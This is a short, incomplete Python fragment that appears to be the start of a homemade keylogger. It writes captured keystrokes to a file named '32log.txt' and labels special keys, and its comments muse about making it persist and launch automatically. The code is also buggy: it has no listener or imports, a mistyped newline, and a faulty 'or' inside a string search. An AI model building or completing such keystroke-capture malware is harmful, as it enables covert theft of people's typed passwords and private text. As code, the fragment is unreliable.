def KingA():

#writing the file into a txt document
    def write_file(keys):
        with open("32log.txt", "w") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
                elif k.find("enter") >0:
                    f.write("Screenshot")
                    #find screenshot method
                    f.write('/n')
                elif k.find("backspace") >0:
                    f.write("")
                elif k.find("alt") >0:
                    f.write("Alt")
                elif k.find("<173>" or "<174>" or "<175>") > 0:
                    f.write("Audio Change")

    def on_release(key):
        if key == Key.esc:
            return False
    #if we want we could try to make this save the txt file then run an inf. loop
    #then make it always begin start on run
